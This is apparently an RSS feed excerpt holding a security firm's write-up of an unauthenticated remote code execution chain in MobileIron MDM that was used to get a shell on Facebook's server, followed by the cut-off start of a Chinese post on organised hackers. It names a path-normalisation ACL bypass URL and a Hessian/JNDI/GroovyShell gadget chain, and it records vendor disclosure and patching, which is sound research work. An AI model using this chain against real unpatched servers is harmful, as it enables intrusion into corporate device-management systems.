&lt;p&gt;MDM, as a centralized system, can manage and control all employeesâ€™ devices. It is undoubtedly an ideal asset assessment system for a growing company. Besides, MDM must be reachable publicly to synchronize devices all over the world. A centralized and public-exposing appliance, what could be more appealing to hackers?&lt;/p&gt;

&lt;p&gt;Therefore, we have seen hackers and APT groups abusing MDM these years! Such as phishing victims to make MDM a C&amp;amp;C server of their mobile devices, or even compromising the corporate exposed MDM server to push malicious Trojans to all devices. You can read the report &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Letâ€™s Hide This App&lt;/a&gt; by Cisco Talos team and &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt; by CheckPoint CPR team for more details!&lt;/p&gt;

&lt;p&gt;From previous cases, we know that MDM is a solid target for hackers, and we would like to do research on it. There are several MDM solutions, even famous companies such as Microsoft, IBM and Apple have their own MDM solution. Which one should we start with?&lt;/p&gt;

&lt;p&gt;We have listed known MDM solutions and scanned corresponding patterns all over the Internet. We found that the most prevalent MDMs are VMware AirWatch and MobileIron!&lt;/p&gt;

&lt;p&gt;So, why did we choose MobileIron as our target? According to their official website, more than 20,000 enterprises chose MobileIron as their MDM solution, and most of our customers are using that as well. We also know Facebook has exposed the MobileIron server &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;since 2016&lt;/a&gt;. We have analyzed Fortune Global 500 as well, and found more than 15% using and exposing their MobileIron server to the public! Due to above reasons, it became our main target!&lt;/p&gt;

&lt;h2 id=&quot;where-to-start&quot;&gt;Where to Start&lt;/h2&gt;

&lt;p&gt;From &lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;past vulnerabilities&lt;/a&gt;, we learned there arenâ€™t too many researchers diving into MobileIron. Perhaps the attack vector is still unknown. But we suspect the main reason is that the firmware is too hard to obtain. When researching an appliance, turning a pure BlackBox testing into GrayBox, or WhiteBox testing is vital. We spent lots of time searching for all kinds of information on the Internet, and ended up with an RPM package. This RPM file is supposed to be the developerâ€™s testing package. The file is just sitting on a listable WebRoot and indexed by Google Search.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anyway, we got a file to research. The released date of the file is in early 2018. It seems a little bit old but still better than nothing!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. We have informed MobileIron and the sensitive files has been removed now.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;finding-vulnerabilities&quot;&gt;Finding Vulnerabilities&lt;/h2&gt;

&lt;p&gt;After a painful time solving the dependency hell, we set the testing package up finally. The component is based on Java and exposed three ports:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;443 - the user enrollment interface&lt;/li&gt;
  &lt;li&gt;8443 - the appliance management interface&lt;/li&gt;
  &lt;li&gt;9997 - the MobileIron device synchronization protocol (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All opened ports are TLS-encrypted. Apache is in the front of the web part and proxies all connections to backend, a Tomcat with Spring MVC inside.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Due to the Spring MVC, itâ€™s hard to find traditional vulnerabilities like SQL Injection or XSS from a single view. Therefore, examining the logic and architecture is our goal this time!&lt;/p&gt;

&lt;p&gt;Talking about the vulnerability, the root cause is straightforward. Tomcat exposed a Web Service that deserializes user input with Hessian format. However, this doesnâ€™t mean we can do everything! The main effort of this article is to solve that, so please see the exploitation below.&lt;/p&gt;

&lt;p&gt;Although we know the Web Service deserializes the user input, we can not trigger it. The endpoint is located on both:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User enrollment interface - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Management interface - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron:8443/mics/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can only touch the deserialization through the management interface because the user interface blocks the Web Service access. Itâ€™s a critical hit for us because most enterprises wonâ€™t expose their management interface to the Internet, and a management-only vulnerability is not useful to us so that we have to try harder. :(&lt;/p&gt;

&lt;p&gt;Scrutinizing the architecture, we found Apache blocks our access through Rewrite Rules. It looks good, right?&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;MobileIron relied on Apache Rewrite Rules to block all the access to Web Service. Itâ€™s in the front of a reverse-proxy architecture, and the backend is a Java-based web server.&lt;/p&gt;

&lt;p&gt;Have you recalled something?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Yes, the &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! Itâ€™s the reverse proxy attack surface I &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;proposed in 2015&lt;/a&gt;, and presented at &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt;. This technique leverage the inconsistency between the Apache and Tomcat to bypass the ACL control and reaccess the Web Service. BTW, this excellent technique is also applied to the recently &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;F5 BIG-IP TMUI RCE vulnerability&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploiting-vulnerabilities&quot;&gt;Exploiting Vulnerabilities&lt;/h2&gt;

&lt;p&gt;OK, now we have access to the deserialization wherever itâ€™s on enrollment interface or management interface. Letâ€™s go back to exploitations!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; has an awesome research which summarized the Hessian deserialization vulnerability on his whitepaper, &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt;. From the &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; source code, we learn the Hessian deserialization triggers the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;equals()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; while reconstructing a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HashMap&lt;/code&gt;. It could also trigger the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toString()&lt;/code&gt; through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XString&lt;/code&gt;, and the known exploit gadgets so far are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In our environment, we could only trigger the Spring AOP gadget chain and get a JNDI Injection.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Â &lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;âˆš&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI Injection&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Once we have a JNDI Injection, the rest parts of exploitations are easy! We can just leverage &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro MuÃ±oz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt;â€™s work, &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt;, from Black Hat USA 2016 to get the code executionâ€¦ Is that true?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Since &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro MuÃ±oz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; introduced this on Black Hat, we could say that this technique helps countless security researchers and brings Java deserialization vulnerability into a new era. However, Java finally mitigated the last JNDI/LDAP puzzle in &lt;a href=&quot;https://www.oracle.com/java/technologies/javase/8u181-relnotes.html&quot;&gt;October 2018&lt;/a&gt;. After that, all java version higher than 8u181, 7u191, and 6u201 can no longer get code execution through JNDI remote URL-Class loading. Therefore, if we exploit the Hessian deserialization on the latest MobileIron, we must face this problem!&lt;/p&gt;

&lt;p&gt;Java changed the default value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; to prevent attackers from downloading remote URL-Class to get code executions. But only this has been prohibited. We can still manipulate the JNDI and redirect the Naming Reference to a local Java Class!&lt;/p&gt;

&lt;p&gt;The concept is a little bit similar to &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt;, utilizing a local existing Java Class to do further exploitations. You can refer to the article &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; in early 2019 for details. It describes the attack on POST-JNDI exploitations and how to abuse the Tomcatâ€™s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; to populate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; gadget to get code execution. Based on this concept, researcher &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; also provides another &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; gadget on Groovy. As described in &lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;his (Chinese) article&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;é™¤äº† javax.el.ELProcessorï¼Œå½“ç„¶ä¹Ÿè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„ç±»ç¬¦åˆæ¡ä»¶å¯ä»¥ä½œä¸º beanClass æ³¨å…¥åˆ° BeanFactory ä¸­å®ç°åˆ©ç”¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœç›®æ ‡æœºå™¨ classpath ä¸­æœ‰ groovy çš„åº“ï¼Œåˆ™å¯ä»¥ç»“åˆä¹‹å‰ Orange å¸ˆå‚…å‘è¿‡çš„ &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins çš„æ¼æ´å®ç°åˆ©ç”¨&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;It seems the Meta Programming exploitation in my previous Jenkins research could be used here as well. It makes the Meta Programming great again :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The approach is fantastic and looks feasible for us. But both gadgets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; are unavailable due to our outdated target libraries. Tomcat introduced the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; since 8.5, but our target is 7. As for the Groovy gadget, the target Groovy version is too old (1.5.6 from 2008) to support the Meta Programming, so we still have to find a new gadget by ourselves. We found a new gadget on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; in the end. If you are interested, you can check the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt; I sent to the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; project!&lt;/p&gt;

&lt;h2 id=&quot;attacking-facebook&quot;&gt;Attacking Facebook&lt;/h2&gt;

&lt;p&gt;Now we have a perfect RCE by chaining JNDI Injection, Tomcat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt;. Itâ€™s time to hack Facebook!&lt;/p&gt;

&lt;p&gt;Aforementioned, we knew the Facebook uses MobileIron since 2016. Although the serverâ€™s index responses 403 Forbidden now, the Web Service is still accessible!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Everything is ready and wait for our exploit! However, several days before our scheduled attack, we realized that there is a critical problem in our exploit. From &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;our last time popping shell on Facebook&lt;/a&gt;, we noticed it blocks outbound connections due to security concerns. The outbound connection is vital for JNDI Injection because the idea is to make victims connecting to a malicious server to do further exploitations. But now, we canâ€™t even make an outbound connection, not to mention others.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;So far, all attack surfaces on JNDI Injection have been closed, we have no choice but to return to Hessian deserialization. But due to the lack of available gadgets, we must discover a new one by ourselves!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before discovering a new gadget, we have to understand the existing gadgetsâ€™ root cause properly. After re-reading Moritz Bechlerâ€™s &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;paper&lt;/a&gt;, a certain word interested me:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovyâ€™s MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;A question quickly came up in my mind: Why did the author leave this word here? Although it failed with exceptions, there must have been something special so that the author write this down.&lt;/p&gt;

&lt;p&gt;Our target is running with a very old Groovy, so we are guessing that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; constrain might not have been applied to the code base yet! We compared the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; between the latest and 1.5.6.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yes, we are right. There is no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; in Groovy 1.5.6, and we later learned &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; is just for that. Itâ€™s a mitigation for the rising Java deserialization vulnerability in 2015. Since Groovy is an internally used library, developers wonâ€™t update it if there is no emergency. The outdated Groovy could also be a good case study to demonstrated how a harmless component can leave you compromised!&lt;/p&gt;

&lt;p&gt;Of course we got the shell on Facebook in the end. Here is the video:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;vulnerability-report-and-patch&quot;&gt;Vulnerability Report and Patch&lt;/h2&gt;

&lt;p&gt;We have done all the research on March and sent the advisory to MobileIron at 4/3. The MobileIron released the patch on 6/15 and addressed three CVEs for that. You can check the &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;official website&lt;/a&gt; for details!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After the patch has been released, we start monitoring the Internet to track the overall fixing progress. Here we check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; header on static files so that the result is just for your information. (Unknown stands for the server closed both 443 and 8443 ports)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;At the same time, we keep our attentions on Facebook as well. With 15 days no-patch confirm, we finally popped a shell and report to their Bug Bounty program at 7/2!&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;So far, we have demonstrated a completely unauthenticated RCE on MobileIron. From how we get the firmware, find the vulnerability, and bypass the JNDI mitigation and network limitation. There are other stories, but due to the time, we have just listed topics here for those who are interested:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;How to take over the employeesâ€™ devices from MDM&lt;/li&gt;
  &lt;li&gt;Disassemble the MI Protocol&lt;/li&gt;
  &lt;li&gt;And the CVE-2020-15506, an interesting authentication bypass&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope this article could draw attention to MDM and the importance of enterprise security! Thanks for reading. :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>æ•µäººä¸æ˜¯å‹’è´–è»Ÿé«”ï¼Œè€Œæ˜¯çµ„ç¹”å‹é§­å®¢</title>
                <description>&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;é§­å®¢æ”»æ“Šäº‹ä»¶ä¸€ç›´å­˜åœ¨æ–¼çœŸå¯¦ä¸–ç•Œï¼Œåªæ˜¯é®®å°‘è¢«å®Œæ•´å…¬é–‹æ­éœ²ã€‚ä»Šå¹´åœ‹å…§ä¸€äº›é‡å¤§é—œéµåŸºç¤è¨­æ–½ (Critical Information Infrastructure Protectionï¼ŒCIIP) ä»¥åŠåœ‹å…§çš„è·¨åœ‹ä¼æ¥­ç´›ç´›ç™¼ç”Ÿåš´é‡çš„è³‡å®‰äº‹ä»¶ï¼Œæˆ‘å€‘æƒ³ç°¡å–®çš„è·Ÿå¤§å®¶è«‡è«‡é€™äº›äº‹ä»¶èƒŒå¾Œä¼æ¥­çœŸæ­£éœ€è¦æ€è€ƒåŠé‡è¦–çš„æ ¸å¿ƒå•é¡Œã€‚&lt;/p&gt;

&lt;h2 id=&quot;ä¼æ¥­é¢å°çš„æ˜¯çµ„ç¹”å‹é§­å®¢è€Œä¸åªæ˜¯å‹’è´–è»Ÿé«”&quot;&gt;ä¼æ¥­é¢å°çš„æ˜¯çµ„ç¹”å‹é§­å®¢è€Œä¸åªæ˜¯å‹’è´–è»Ÿé«”&lt;/h2&gt;

&lt;p&gt;ä¸çŸ¥é“æ˜¯å› ç‚ºå‹’è´–è»Ÿé«”æ¯”è¼ƒå¸ç›é‚„æ˜¯ä»€éº¼ç·£æ•…ï¼Œåª’é«”æ¯”è¼ƒå–œæ­¡ç”¨å‹’è´–è»Ÿé«”ä½œç‚ºæ¨™é¡Œå‘ˆç¾è¿‘å¹´ä¼æ¥­é¢è‡¨çš„é‡å¤§å¨è„…ã€‚å¯¦éš›ä¸Šï¼Œå‹’è´–è»Ÿé«”åªæ˜¯æ”»æ“Šéç¨‹çš„å·¥å…·ã€åŠ å¯†åªæ˜¯å‹’è´–çš„æ‰‹æ®µä¹‹ä¸€ï¼Œç”šè‡³åŒ…å«ç«Šå–æ©Ÿæ•è³‡æ–™ã€‚å› ç‚ºé€™äº›äº‹ä»¶æˆ‘å€‘æ²’æœ‰åƒèˆ‡èª¿æŸ¥æˆ–ç›¸é—œçš„æ´»å‹•ï¼Œæˆ‘å€‘åƒ…å°±å·²å…¬é–‹æ­éœ²çš„è³‡æ–™ä¾†ä¸€çªºé¢å°é€™æ¨£çš„å¨è„…ï¼Œä¼æ¥­çš„å…·é«”åšæ³•æœ‰å“ªäº›ï¼Ÿ&lt;/p&gt;

&lt;p&gt;æ ¹æ“šæ³•å‹™éƒ¨èª¿æŸ¥å±€åœ¨ iThome 2020 è³‡å®‰å¤§æœƒçš„&lt;a href=&quot;https://www.ithome.com.tw/news/139331&quot;&gt;åˆ†äº«&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;åœ¨é€™èµ·æ”»æ“Šäº‹ä»¶ä¸­ï¼Œé§­å®¢é¦–å…ˆå¾ Web ä¼ºæœå™¨ã€å“¡å·¥é›»è…¦ç­‰é€”å¾‘ï¼Œå…¥ä¾µå…¬å¸ç³»çµ±é•·æœŸæ½›ä¼åŠæ¢æ¸¬ï¼Œè€Œå¾Œç«Šå–å¸³è™Ÿæ¬Šé™ï¼Œé€²å…¥ AD ä¼ºæœå™¨ï¼Œåˆ©ç”¨å‡Œæ™¨æ™‚æ®µç«„æ”¹ç¾¤çµ„æ´¾é€åŸå‰‡ï¼ˆGPOï¼‰ï¼ŒåŒæ™‚é åŸ‹ lc.tmp æƒ¡æ„ç¨‹å¼åˆ°å…§éƒ¨ä¼ºæœå™¨ä¸­ï¼Œç­‰åˆ°å“¡å·¥ä¸Šç­æ‰“é–‹é›»è…¦å¾Œï¼Œé›»è…¦ç«‹å³å¥—ç”¨é­ç«„æ”¹çš„ GPOï¼Œä¾æ“šæŒ‡ä»¤å°±æœƒè‡ªå‹•å°‡å‹’ç´¢è»Ÿé«”è¼‰åˆ°è¨˜æ†¶é«”ä¸­ä¾†åŸ·è¡Œã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ä¼æ¥­åœ¨è¢«å‹’è´–è»Ÿé«”åŠ å¯†å¾Œï¼Œå¾€å¾€ç¬¬ä¸€æ™‚é–“å®¹æ˜“ç›´è¦ºæƒ³åˆ°é˜²æ¯’è»Ÿé«”æˆ–ç«¯é»é˜²è­·è¨­å‚™ç‚ºä½•æ²’æœ‰ç”Ÿæ•ˆï¼Ÿç¾å¯¦æ˜¯ï¼Œå¦‚æœä¼æ¥­é¢å°çš„æ˜¯é‡å°å¼çš„æ”»æ“Šï¼ˆAdvanced Persistent Threatï¼ŒAPTï¼‰ï¼Œæ”»æ“Šè€…å‹¢å¿…æœƒç ”ç©¶å¯ä»¥ç¹éä¼æ¥­çš„é˜²è­·æˆ–ç›£æ§çš„æ–¹å¼ã€‚æ‰€ä»¥ä¼æ¥­è¦æ€è€ƒçš„æ‡‰è©²æ˜¯ä¸€å€‹é˜²ç¦¦æˆ°ç·šæˆ–æ›´ç‚ºå…¨é¢çš„é˜²è­·ç­–ç•¥ï¼Œè€Œéä»°è³´å–®ä¸€çš„è³‡å®‰è¨­å‚™æˆ–æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;å¾ä¸Šè¿°çš„æ•˜è¿°ï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾å¹¾å€‹å•é¡Œï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Web ä¼ºæœå™¨å…·æœ‰å¯åˆ©ç”¨çš„æ¼æ´&lt;/strong&gt;ï¼Œè€Œé€™å€‹æ¼æ´å¯èƒ½å°è‡´ä¸»æ©Ÿè¢«å–å¾—æ¬Šé™é€²è¡Œå¾ŒçºŒçš„æ©«å‘ç§»å‹•ã€‚é€ æˆé€™å€‹å•é¡Œçš„åŸå› å¯èƒ½åŒ…å«ï¼š
    &lt;ul&gt;
